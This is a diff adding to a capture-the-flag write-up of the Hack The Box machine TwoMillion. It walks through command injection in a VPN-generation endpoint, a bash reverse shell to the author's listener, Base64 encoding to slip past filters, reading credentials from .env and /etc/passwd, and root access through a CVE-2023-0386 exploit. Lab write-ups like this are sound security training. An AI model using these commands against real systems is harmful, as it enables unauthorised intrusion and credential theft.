@@ -14,13 +14,14 @@ Hello,
 
   
 
-############################################################## WRITEUP ############################################################## 
+################################### WRITEUP ###################################
 
 HTB Machine: TwoMillion
 
-############################################################## ENUMERATION PHASE ##############################################################
+################################### ENUMERATION PHASE ###################################
 
 Let's begin by pinging the machine to ensure connectivity.
+
 ![image](https://github.com/user-attachments/assets/a6aede84-cb42-4e54-a071-0052116a3b92)
 
 Success!
@@ -154,7 +155,132 @@ Rechecking admin status by curl'ing to the /admin/auth endpoint
 
 I am an admin. 
 
-############################################################## FOOTHOLD PHASE ##############################################################
+
+
+################################### FOOTHOLD PHASE ###################################
+
+Now that I have confirmed admin privileges, I want to go back and try the the /vpn/generate endpoint
+
+![image](https://github.com/user-attachments/assets/29969ead-7540-410c-bba8-1e31540ef8d0)
+
+Missing a username. 
+Let's add mine (random).
+
+![image](https://github.com/user-attachments/assets/c03aced5-76f8-4233-956d-148df36f25c2)
+
+The VPN config was printed to screen. After doing some digging and consultation with ChatGPT, if a site lets users request or generate a VPN config (.ovpn file) it is likely that running a backend shell command to do this.
+
+I'm led to believe that this may be a vulnerability allowing for code injection (as long as there is insufficient sanitization or strong use of parameterized queries).
+
+I want to try injecting a command to see if it's vulnerable. Let's use whoami.
+
+![image](https://github.com/user-attachments/assets/a885fc39-c6d2-486e-a496-a4641db40215)
+
+I got a successfull answer. This was vulnerable to command injection.
+
+Because of this, I want to start a Netcat listener on my machine (port 4444).
+
+![image](https://github.com/user-attachments/assets/4e32669e-aed7-4b04-bee9-57625e334b90)
+
+I need to then choose a payload to send: 
+1) use grep tun0 to find my HTB VPN IP
+2) Create bash reverse shell:  "bash -i >& /dev/tcp/10.10.14.104/4444 0>&1"
+        explanation:
+          - -i               --> interactive shell
+          - '>&              --> redirect stdout & stderr to [my listener]
+          - 0>&1             --> redirect stdin to come from same place as stdout (allows both input/output to pass over TCP socket)
+3) I think that the reverse shell command should be Base64 encoded (as most command injections are) to avoid special character problems and also to bypass WAFs and Filters that actively scan for strings like this. 
+
+![image](https://github.com/user-attachments/assets/8069663a-e4c7-45c7-931a-5f61abf69052)
+
+The reverse shell worked. Here's the output:
+
+![image](https://github.com/user-attachments/assets/d0ab3b68-0542-4fc2-8bc5-1d151b7f7d28)
+
+
+
+################################### LATERAL MOVEMENT PHASE ###################################
+
+I used the "ls -la" command to show all visible and hidden files.
+
+![image](https://github.com/user-attachments/assets/8bc4b962-f168-4a70-9816-7d316064ccb6)
+
+There was nothing of interest in any of the files other than the hidden file ".env" (.<filename> indicates hidden file).
+
+![image](https://github.com/user-attachments/assets/ad8d01d0-e0af-455d-8b67-719baecfd9d4)
+
+Here, I see an admin username/password.
+
+Looking at the /etc/passwd file, it is confirmed that "admin" is an active user.
+
+![image](https://github.com/user-attachments/assets/146bb2a3-9f2d-4add-8807-4d8bd84cdfea)
+
+With this password, I will SSH with the "admin" credentials.
+
+![image](https://github.com/user-attachments/assets/a8e310a1-a3fa-4032-897a-6148ad98815f)
+
+There is nothing of interest when performing ls from the home directory (~).
+
+I investigate further, finding a file "admin" in /var/mail.
+
+![image](https://github.com/user-attachments/assets/117f8514-c38b-46d3-ad10-329a75c7ebee)
+
+
+
+################################### PRIVILEGE ESCALATION PHASE ###################################
+
+A google search of "OverlayFS / Fuse CVE" reveals CVE-2023-0386 exists on Linux_Kernel 5.11-5.15.91.
+
+Let's check the kernel version on this machine using "uname -a"
+
+![image](https://github.com/user-attachments/assets/801702bb-dc48-4466-a7c5-15845632d3de)
+
+Looks like the version is a vulnerable one. Let's find an exploit online.
+
+I found the following github repository with an exploit: https://github.com/sxlmnwb/CVE-2023-0386
+
+I'll clone the repo, compress it, and upload it to the vulnerable system.
+
+![image](https://github.com/user-attachments/assets/624da50f-460e-45a0-b96e-6befacc6489d)
+
+![image](https://github.com/user-attachments/assets/e3d89916-f429-442b-867d-daf8976b4234)
+
+![image](https://github.com/user-attachments/assets/c3f8fa4b-cbc7-428a-8855-c2a8aa6410b3)
+
+I'll go back to the shell and unzip it.
+
+![image](https://github.com/user-attachments/assets/33587a36-4794-4857-929e-173b4da544bb)
+
+The github instructions are as follows:
+1) start 2 terminals
+  2) in the first --> "./fuse ./ovlcap/lower ./gc"
+  3) in the second --> "./exp"
+
+![image](https://github.com/user-attachments/assets/d7f65fb9-4f02-4204-9e89-8efcc5ee9dbe)
+
+Confirming root privileges...
+
+![image](https://github.com/user-attachments/assets/cb51cf5d-5891-4b5d-98bf-07c4660bb316)
+
+Checking for files in root directory...
+
+![image](https://github.com/user-attachments/assets/ea1a2b2e-e44b-4165-b88b-f384c6d6c259)
+
+Investigating "thank_you.json"
+
+![image](https://github.com/user-attachments/assets/06f7ca77-9438-4cf9-b22d-8aa99d010f21)
+
+The text is URL-encoded. Lets open BurpSuite to decode:
+
+After decoding, we find that it is still Hex-encoded. 
+
+
+
+
+
+
+
+https://github.com/mreyer0339/HackTheBoxCTFWriteups/new/main
 
 
 
